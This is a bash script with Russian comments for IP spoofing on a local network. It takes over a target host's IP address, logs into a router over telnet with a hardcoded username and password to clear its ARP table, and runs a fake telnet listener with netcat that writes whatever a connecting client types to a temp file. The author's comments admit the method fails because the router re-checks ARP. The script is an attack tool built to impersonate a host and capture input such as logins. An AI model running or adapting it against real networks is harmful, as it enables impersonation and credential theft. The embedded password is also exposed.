#!/bin/bash
#Скрипт обман, как только запингуеться 172.19.0.0/21 мы возьмём ip и поднимем 23 порт, как подключение состоиться вернём всё на свои места.
#Понадобилось добавить правило в iptabless перед DROP iptables -t filter -I INPUT 3 -s 172.19.0.0/21 -i eth1.10 -p tcp --dport 23 -j ACCEPT
#и  ip route add 172.19.0.1 dev eth1.10, где 172.19.0.1 gateway.
#Не работает, так как  при очищениии arp маршрутизатор переспрашивает, вот пример:
#nchelny-cgs-pert2#clear ip arp 172.19.1.13
#00:13:c3:2b:ad:c0 > 00:50:ba:85:53:43, ethertype ARP (0x0806), length 60: Request who-has 172.19.1.13 (00:50:ba:85:53:43) tell 172.19.0.1, length 46
#00:50:ba:85:53:43 > 00:13:c3:2b:ad:c0, ethertype ARP (0x0806), length 42: Reply 172.19.1.13 is-at 00:50:ba:85:53:43, length 28
#и в таблице опять запись с не нужным(правильным) маком коммутатора.

[ "$UID" != "0" ] && { echo "Operation not permitted";exit 1;}
#Переменные для expect, для стирания arp table.
username=dima.z
password=pfqwtd777
funEXPECT ()
{
/usr/bin/expect -c \
"
set timeout 1
spawn telnet 192.168.33.1
while 1 {
expect Username  { send $username\n}
expect Password { send $password\n}
expect pert { break}
}

send enable\n
while 1 { expect Password { send $password\n; break}}
while 1 { expect \# { send clear\ ip\ arp\ $ip_spoof\n; break}}
while 1 { expect \# { send exit\n; break}}
"
}

for pack in figlet boxes
 do
  dpkg-query -s $pack &>/dev/null || { echo "$pack not installed"; exit 1;}
 done
ip_spoof=${1:-172.19.7.254}
message=${2:-You will do it}
while ! ping -c 1 -W 1 $ip_spoof
do
:
done
#Берём себе тотже ip.
ip address add $ip_spoof/21 dev eth1.10 || ip address chan $ip_spoof/21 dev eth1.10
#Что бы маршрутизатор знал о нашем mac-е (arp table).
ip route add 172.19.0.1 dev eth1.10 src $ip_spoof || ip route chan 172.19.0.1 dev eth1.10 src $ip_spoof
ping 172.19.0.1 -A -c 800 &
funEXPECT
#Выводим сообщение в ascii графике потом передаем коту на табличку, и это всё на ввод открытому порту 23(telnet),
#всё что введёт клиент подключившийся к нам поподёт в /tmp/telnet_spoofing.tmp , а это и будет сигналом что подключение состоялось.
figlet "$message" | boxes -d cat | nc -l -p 23 > /tmp/telnet_spoofing.tmp &
#Пока ничего в фале нет то цикл будет крутиться.
while test `(du -s /tmp/telnet_spoofing.tmp | cut -f 1)` = "0"
do
 ping -c 1 -W 1 172.19.0.1
 ip route get 172.19.0.1
done
#Удаляем ip.
#cat /tmp/telnet_spoofing.tmp
#Убьём все запущенные nc(netcat), а он у нас крутиться в фоне.
killall nc
#Удалим чужой ip.
ip address del $ip_spoof/21 dev eth1.10
ip route chan 172.19.0.1 dev eth1.10 src 172.19.1.13
funEXPECT
